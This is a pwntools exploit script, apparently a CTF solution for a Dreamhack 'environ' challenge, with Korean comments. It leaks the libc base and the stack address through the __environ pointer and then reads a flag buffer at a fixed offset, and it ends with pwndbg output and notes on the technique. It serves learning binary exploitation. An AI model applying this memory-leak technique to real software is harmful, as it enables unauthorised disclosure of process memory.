from pwn import *

p = process("./environ")
# p = remote("host8.dreamhack.games", 19679)
e = ELF("./environ")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
#! 서버 환경은 ./libc.so.6 이지만, 로컬에서는 설정하기 어려워 vmmap으로 확인한 libc와 연결하여 offset을 구하고 읽음.

#Leak libc_base
p.recvuntil(b"stdout: ")
stdout = int(p.recvuntil(b"\n"), 16) #printf 출력 시.
#? stdout = u64(p.recvuntil(b"\n")[:6].ljust(8, b"\x00")) # 잘못된 표현 write 출력 시 이렇게 받을 것.
print("stdout: ", hex(stdout))
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
print("Libc base: ", hex(libc_base))

#Calc libc_environ
libc_environ = libc_base + libc.symbols["__environ"] #still integer.
print("Libc environ: ", hex(libc_environ))

#Leak stack_environ
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Addr: ", str(libc_environ).encode())
stack_environ = u64(p.recv(6).ljust(8, b"\x00"))
print("stack environ: ", hex(stack_environ))

#Calc file_buf ~ read_flag
read_flag = stack_environ - 0x1578
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Addr: ", str(read_flag).encode())
p.interactive()



# pwndbg> p/x $rbp-0x1010
#? $1 = 0x7fffffffcbd0             $rbp-0x1010
# pwndbg> p __environ
#? $1 = (char **)  0x7fffffffe148  __environ
# pwndbg> p &__environ
# $2 = (char ***) 0x7ffff7ffe2d0 <environ>
#? pwndbg> x/gx $rbp-0x1010
#? 0x7fffffffcbd0: 0x0000000000205000
# pwndbg> x/s *__environ
# 0x7fffffffe3c3: "SHELL=/bin/bash"
#TODO pwndbg> p/x 0x7fffffffe148-0x7fffffffcbd0
#TODO $7 = 0x1578 //stack에 자리잡은 __environ 포인터와 file_buf[4096]의 offset
#// Exploit tech
#// ld 가 프로세스에서 환경변수를 참조하기 위해 환경변수를 스택 상에 로드하게 되는데
#// 이를 가리키는 포인터가 !!libc_environ pointer!!
#// libc_environ -> stack_environ 을 가리키고 있고, 
#// 이를 이용해 임의 주소 읽기를 이용해 stack_environ_addr 을 읽어내면(printf는 NULL을 만나면 종료.)
#// 스택의 주소를 파악할 수 있다. 이를 이용해 offset을 빼서 file_buf의 내용을 Leak!!